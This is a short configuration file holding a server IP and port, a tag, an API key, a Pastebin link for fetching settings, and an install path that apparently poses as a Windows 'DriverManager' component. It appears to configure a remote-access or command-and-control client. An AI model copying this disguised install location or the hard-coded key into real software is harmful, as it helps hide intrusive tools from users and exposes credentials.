IP = "127.0.0.1"
PORT = "5000"
TAG_NAME = "test"
API_KEY = "eab2f559f6fc1d0605859563bff580faf0a9640a772c739acfe645fd6f90f1b6"
INSTALL_LOCATION = r"%LOCALAPPDATA%\\Packages\\Windows\\DriverManager"
USE_PASTEBIN = False
PASTEBIN_LINK = "https://pastebin.com/raw/TnnLDV0i"
